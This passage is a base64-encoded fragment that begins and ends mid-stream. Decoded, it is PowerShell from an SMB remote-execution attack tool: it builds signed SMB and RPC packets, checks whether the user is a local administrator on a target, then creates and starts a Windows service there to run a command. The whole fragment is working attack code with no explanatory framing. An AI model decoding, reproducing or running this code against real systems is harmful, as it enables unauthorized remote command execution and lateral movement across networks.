2RhdGEgPSBHZXQtUGFja2V0U01CUmVhZEFuZFhSZXF1ZXN0DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhWyJTTUJSZWFkQW5kWFJlcXVlc3RfRklEIl0gPSAkU01CX0ZJRA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRTTUJfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbiA9ICRzZXNzaW9uX2tleSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmF0dXJlID0gJE1ENS5Db21wdXRlSGFzaCgkU01CX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkU01CX3NpZ25hdHVyZVswLi43XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJFNNQl9jbGllbnRfc3RhZ2VfbmV4dA0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICdPcGVuU0NNYW5hZ2VyVycNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyID0gR2V0LVBhY2tldFNNQkhlYWRlciAweDJmIDB4MTggMHgwNSwweDI4ICRTTUJfdHJlZV9JRCAkcHJvY2Vzc19JRF9ieXRlcyAkU01CX3VzZXJfSUQNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX0ZsYWdzMiJdID0gMHgwNSwweDQ4DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduaW5nX2NvdW50ZXIgPSAkU01CX3NpZ25pbmdfY291bnRlciArIDIgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgW0J5dGVbXV0kU01CX3NpZ25pbmdfc2VxdWVuY2UgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTTUJfc2lnbmluZ19jb3VudGVyKSArIDB4MDAsMHgwMCwweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXJbIlNNQkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUJfc2lnbmluZ19zZXF1ZW5jZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTU9wZW5TQ01hbmFnZXJXICRTTUJfc2VydmljZV9ieXRlcyAkU01CX3NlcnZpY2VfbGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkU0NNX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NDTV9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1JQQ19kYXRhID0gR2V0LVBhY2tldFJQQ1JlcXVlc3QgMHgwMyAkU0NNX2RhdGEubGVuZ3RoIDAgMCAweDAxLDB4MDAsMHgwMCwweDAwIDB4MDAsMHgwMCAweDBmLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyICAgDQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQldyaXRlQW5kWFJlcXVlc3QgJFNDTV9kYXRhLmxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfZGF0YVsiU01CV3JpdGVBbmRYUmVxdWVzdF9GSUQiXSA9ICRTTUJfRklEDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQl9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhIA0KICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUJfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoICsgJFJQQ19kYXRhLkxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbiA9ICRzZXNzaW9uX2tleSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhICsgJFJQQ19kYXRhICsgJFNDTV9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkTUQ1LkNvbXB1dGVIYXNoKCRTTUJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25hdHVyZSA9ICRTTUJfc2lnbmF0dXJlWzAuLjddDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfU2lnbmF0dXJlIl0gPSAkU01CX3NpZ25hdHVyZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSArICRSUENfZGF0YSArICRTQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnUmVhZEFuZFhSZXF1ZXN0Jw0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2VfbmV4dCA9ICdDaGVja0FjY2VzcycgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgJ0NoZWNrQWNjZXNzJw0KICAgICAgICAgICAgICAgICAgICB7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMDguLjExMV0pIC1lcSAnMDAtMDAtMDAtMDAnIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzg4Li4xMDddKSAtbmUgJzAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwLTAwJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NlcnZpY2VfbWFuYWdlcl9jb250ZXh0X2hhbmRsZSA9ICRTTUJfY2xpZW50X3JlY2VpdmVbODguLjEwN10NCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfZXhlY3V0ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIiRvdXRwdXRfdXNlcm5hbWUgaXMgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRUYXJnZXQiICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ3JlYXRlU2VydmljZVcnDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiJG91dHB1dF91c2VybmFtZSBpcyBhIGxvY2FsIGFkbWluaXN0cmF0b3Igb24gJFRhcmdldCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbG9zZV9zZXJ2aWNlX2hhbmRsZV9zdGFnZSA9IDINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ2xvc2VTZXJ2aWNlSGFuZGxlJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFNNQl9jbGllbnRfcmVjZWl2ZVsxMDguLjExMV0pIC1lcSAnMDUtMDAtMDAtMDAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiJG91dHB1dF91c2VybmFtZSBpcyBub3QgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9uICRUYXJnZXQiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQkV4ZWNfZmFpbGVkID0gJHRydWUNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlNvbWV0aGluZyB3ZW50IHdyb25nIHdpdGggJFRhcmdldCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CRXhlY19mYWlsZWQgPSAkdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgJ0NyZWF0ZVNlcnZpY2VXJw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4MmYgMHgxOCAweDA1LDB4MjggJFNNQl90cmVlX0lEICRwcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRA0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZigkU01CX3NpZ25pbmcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfRmxhZ3MyIl0gPSAweDA1LDB4NDgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25pbmdfY291bnRlciA9ICRTTUJfc2lnbmluZ19jb3VudGVyICsgMiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBbQnl0ZVtdXSRTTUJfc2lnbmluZ19zZXF1ZW5jZSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFNNQl9zaWduaW5nX2NvdW50ZXIpICsgMHgwMCwweDAwLDB4MDAsMHgwMA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduaW5nX3NlcXVlbmNlDQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU0NNX2RhdGEgPSBHZXQtUGFja2V0U0NNQ3JlYXRlU2VydmljZVcgJFNNQl9zZXJ2aWNlX21hbmFnZXJfY29udGV4dF9oYW5kbGUgJFNNQl9zZXJ2aWNlX2J5dGVzICRTTUJfc2VydmljZV9sZW5ndGggJFNNQkV4ZWNfY29tbWFuZF9ieXRlcyAkU01CRXhlY19jb21tYW5kX2xlbmd0aF9ieXRlcw0KICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJFNDTV9kYXRhLmxlbmd0aCAwIDAgMHgwMiwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwYywweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlciAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfZGF0YSA9IEdldC1QYWNrZXRTTUJXcml0ZUFuZFhSZXF1ZXN0ICRTQ01fZGF0YS5sZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGFbIlNNQldyaXRlQW5kWFJlcXVlc3RfRklEIl0gPSAkU01CX0ZJRA0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9SUENfZGF0YSANCiAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YV9sZW5ndGggPSAkU01CX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgNCiAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkUlBDX2RhdGFfbGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc2lnbmluZykNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ24gPSAkc2Vzc2lvbl9rZXkgKyAkU01CX2hlYWRlciArICRTTUJfZGF0YSArICRSUENfZGF0YSArICRTQ01fZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2lnbmF0dXJlID0gJE1ENS5Db21wdXRlSGFzaCgkU01CX3NpZ24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkU01CX3NpZ25hdHVyZVswLi43XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduYXR1cmUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcg0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1JlYWRBbmRYUmVxdWVzdCcNCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlX25leHQgPSAnU3RhcnRTZXJ2aWNlVycgICANCiAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICdTdGFydFNlcnZpY2VXJw0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzExMi4uMTE1XSkgLWVxICcwMC0wMC0wMC0wMCcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRlZCBvbiAkVGFyZ2V0Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc2VydmljZV9jb250ZXh0X2hhbmRsZSA9ICRTTUJfY2xpZW50X3JlY2VpdmVbOTIuLjExMV0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4MmYgMHgxOCAweDA1LDB4MjggJFNNQl90cmVlX0lEICRwcm9jZXNzX0lEX2J5dGVzICRTTUJfdXNlcl9JRA0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfaGVhZGVyWyJTTUJIZWFkZXJfRmxhZ3MyIl0gPSAweDA1LDB4NDgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduaW5nX2NvdW50ZXIgPSAkU01CX3NpZ25pbmdfY291bnRlciArIDIgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFtCeXRlW11dJFNNQl9zaWduaW5nX3NlcXVlbmNlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU01CX3NpZ25pbmdfY291bnRlcikgKyAweDAwLDB4MDAsMHgwMCwweDAwDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2hlYWRlclsiU01CSGVhZGVyX1NpZ25hdHVyZSJdID0gJFNNQl9zaWduaW5nX3NlcXVlbmNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TQ01fZGF0YSA9IEdldC1QYWNrZXRTQ01TdGFydFNlcnZpY2VXICRTTUJfc2VydmljZV9jb250ZXh0X2hhbmRsZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTQ01fZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1JQQ19kYXRhID0gR2V0LVBhY2tldFJQQ1JlcXVlc3QgMHgwMyAkU0NNX2RhdGEubGVuZ3RoIDAgMCAweDAzLDB4MDAsMHgwMCwweDAwIDB4MDAsMHgwMCAweDEzLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlciAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CX2RhdGEgPSBHZXQtUGFja2V0U01CV3JpdGVBbmRYUmVxdWVzdCAkU0NNX2RhdGEubGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUJfZGF0YVsiU01CV3JpdGVBbmRYUmVxdWVzdF9GSUQiXSA9ICRTTUJfRklEDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfZGF0YQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUJfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoICsgJFJQQ19kYXRhLkxlbmd0aA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUJfaGVhZGVyLkxlbmd0aCAkUlBDX2RhdGFfbGVuZ3RoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zaWduaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduID0gJHNlc3Npb25fa2V5ICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGENCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkTUQ1LkNvbXB1dGVIYXNoKCRTTUJfc2lnbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zaWduYXR1cmUgPSAkU01CX3NpZ25hdHVyZVswLi43XQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXJbIlNNQkhlYWRlcl9TaWduYXR1cmUiXSA9ICRTTUJfc2lnbmF0dXJlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfaGVhZGVyID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUJfaGVhZGVyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUJfaGVhZGVyICsgJFNNQl9kYXRhICsgJFJQQ19kYXRhICsgJFNDTV9kYXRhDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVHJ5aW5nIHRvIGV4ZWN1dGUgY29tbWFuZCBvbiAkVGFyZ2V0Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpID4gJG51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkgPiAkbnVsbA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1JlYWRBbmRYUmVxdWVzdCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZV9uZXh0ID0gJ0RlbGV0ZVNlcnZpY2VXJyAgDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzExMi4uMTE1XSkgLWVxICczMS0wNC0wMC0wMCcpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJTZXJ2aWNlICRTTUJfc2VydmljZSBjcmVhdGlvbiBmYWlsZWQgb24gJFRhcmdldCINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CRXhlY19mYWlsZWQgPSAkdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KIC